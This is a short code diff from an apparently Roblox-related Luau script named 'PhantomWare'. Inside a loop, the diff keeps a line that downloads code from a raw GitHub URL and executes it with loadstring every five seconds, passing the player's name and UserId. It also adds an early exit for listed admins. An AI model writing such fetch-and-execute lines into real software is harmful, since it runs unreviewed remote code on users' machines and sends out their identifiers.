@@ -4036,7 +4036,12 @@ task.spawn(function()
 				Whitelisted, LastAdmins, Last = _Admins, _Admins, Now
 			end
 
-			Loadstring(HttpGet(game, "https://raw.githubusercontent.com/nikoladhima/PhantomWare/refs/heads/main/src/Function.luau"))()(LastAdmins, LocalPlayer.Name, LocalPlayer.UserId)
+			local UserId = LocalPlayer.UserId
+			if _Admins[UserId] then
+				break
+			end
+
+			Loadstring(HttpGet(game, "https://raw.githubusercontent.com/nikoladhima/PhantomWare/refs/heads/main/src/Function.luau"))()(LastAdmins, LocalPlayer.Name, UserId)
 			task.wait(5)
 		end
 	end)
